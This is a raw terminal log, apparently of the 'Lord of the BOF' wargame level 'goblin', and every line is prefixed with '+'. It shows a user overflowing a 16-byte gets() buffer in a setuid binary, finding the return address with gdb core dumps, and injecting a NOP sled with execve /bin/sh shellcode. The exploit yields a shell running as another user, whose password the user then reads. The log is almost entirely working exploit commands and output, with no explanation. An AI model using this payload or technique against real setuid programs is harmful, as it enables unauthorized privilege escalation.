+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+Broken pipe
+[cobolt@localhost cobolt]$ 
+[cobolt@localhost cobolt]$ 
+[cobolt@localhost cobolt]$ 
+[cobolt@localhost cobolt]$ python -c 'print "A"*600' | ./goblin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ ls
+asdf.txt  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ python -c 'print "A"*600' | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ ls
+asdf.txt  core  ex.txt  gablin  goblin  goblin.c
+[cobolt@localhost cobolt]$ gdb -c core  
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `AAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+(gdb) x $esp
+0xbffffb20:	0x41414141
+(gdb) x/64 $esp
+0xbffffb20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb80:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb90:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffba0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) q
+[cobolt@localhost cobolt]$ python -c 'print "A"*100' | ./gablin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[cobolt@localhost cobolt]$ cat ./goblin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\xbf\xbf\xbf\xbf"+"\x90"*100+"\xA"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA¿¿¿¿ 
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\xbf\xbf\xbf\xbf"+"\x90"*100+"\xbf"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA¿¿¿¿¿
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\xbf\xbf\xbf\xbf"+"\x90"*100+"\xbf"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA¿¿¿¿¿
+[cobolt@localhost cobolt]$ gdb -c core 
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./gablin'.
+Program terminated with signal 11, Segmentation fault.
+#0  0xbfbfbfbf in ?? ()
+(gdb) x/64 $esp
+0xbffffb20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb40:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb50:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb60:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb70:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb80:	0x90909090	0xbfff00bf	0xbffffeb8	0xbffffed4
+0xbffffb90:	0xbffffee9	0xbfffff07	0xbfffff12	0xbfffff2b
+0xbffffba0:	0xbfffff3a	0xbfffff42	0xbfffff4c	0xbfffff5c
+0xbffffbb0:	0xbfffff6a	0xbfffff78	0xbfffff89	0xbfffff94
+0xbffffbc0:	0xbfffffa6	0xbfffffe8	0x00000000	0x00000003
+0xbffffbd0:	0x08048034	0x00000004	0x00000020	0x00000005
+0xbffffbe0:	0x00000006	0x00000006	0x00001000	0x00000007
+0xbffffbf0:	0x40000000	0x00000008	0x00000000	0x00000009
+0xbffffc00:	0x08048350	0x0000000b	0x000001f6	0x0000000c
+0xbffffc10:	0x000001f6	0x0000000d	0x000001f6	0x0000000e
+(gdb) 
+0xbffffc20:	0x000001f6	0x00000010	0x0fabfbff	0x0000000f
+0xbffffc30:	0xbffffc52	0x00000000	0x00000000	0x00000000
+0xbffffc40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffc50:	0x36690000	0x2e003638	0x6261672f	0x006e696c
+0xbffffc60:	0x3d445750	0x6d6f682f	0x6f632f65	0x746c6f62
+0xbffffc70:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
+0xbffffc80:	0x2e383631	0x312e3635	0x534f4800	0x4d414e54
+0xbffffc90:	0x6f6c3d45	0x686c6163	0x2e74736f	0x61636f6c
+0xbffffca0:	0x6d6f646c	0x006e6961	0x5353454c	0x4e45504f
+0xbffffcb0:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
+0xbffffcc0:	0x2e657069	0x25206873	0x53550073	0x633d5245
+0xbffffcd0:	0x6c6f626f	0x534c0074	0x4c4f435f	0x3d53524f
+0xbffffce0:	0x303d6f6e	0x69663a30	0x3a30303d	0x303d6964
+0xbffffcf0:	0x34333b31	0x3d6e6c3a	0x333b3130	0x69703a36
+0xbffffd00:	0x3b30343d	0x733a3333	0x31303d6f	0x3a35333b
+0xbffffd10:	0x343d6462	0x33333b30	0x3a31303b	0x343d6463
+(gdb) x/64 $esp-100
+0xbffffabc:	0x401088c0	0x4002982c	0x40021df0	0xbffffaf8
+0xbffffacc:	0x4000a970	0x40106adc	0xbffffb08	0x4005d920
+0xbffffadc:	0x400143e0	0xbffffaf8	0x40066070	0x40106980
+0xbffffaec:	0x08048470	0xbffffb08	0x401081ec	0xbffffb18
+0xbffffafc:	0x08048418	0x08048470	0xbffffb08	0x41414141
+0xbffffb0c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb1c:	0xbfbfbfbf	0x90909090	0x90909090	0x90909090
+0xbffffb2c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb3c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb4c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb5c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb6c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb7c:	0x90909090	0x90909090	0xbfff00bf	0xbffffeb8
+0xbffffb8c:	0xbffffed4	0xbffffee9	0xbfffff07	0xbfffff12
+0xbffffb9c:	0xbfffff2b	0xbfffff3a	0xbfffff42	0xbfffff4c
+0xbffffbac:	0xbfffff5c	0xbfffff6a	0xbfffff78	0xbfffff89
+(gdb) q
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\xbf"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA,¿
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' | ./goblin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+[cobolt@localhost cobolt]$ cat goblin.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - goblin
+        - small buffer + stdin
+*/
+
+int main()
+{
+    char buffer[16];
+    gets(buffer);
+    printf("%s\n", buffer);
+}
+[cobolt@localhost cobolt]$ python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+id
+id
+
+Broken pipe
+[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"') | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat) | ./gablin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+id
+uid=502(cobolt) gid=502(cobolt) groups=502(cobolt)
+exit
+
+[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\x2c\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat) | ./goblin
+AAAAAAAAAAAAAAAAAAAA,1￐h//shh/bin⏓ኂ°
+                                     ̀ 
+id
+uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
+mypass
+/bin//sh: mypass: command not found
+^[[A^[[D: command not found
+/bin//sh: 
+my-pass
+euid = 503
+hackers proof
+exit
+exit
+[cobolt@localhost cobolt]$ exit
+exit
+[cobolt@localhost cobolt]$ exit
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 23:24:26.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+
+hackers proof
+
+
+
+
+broken pipe
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
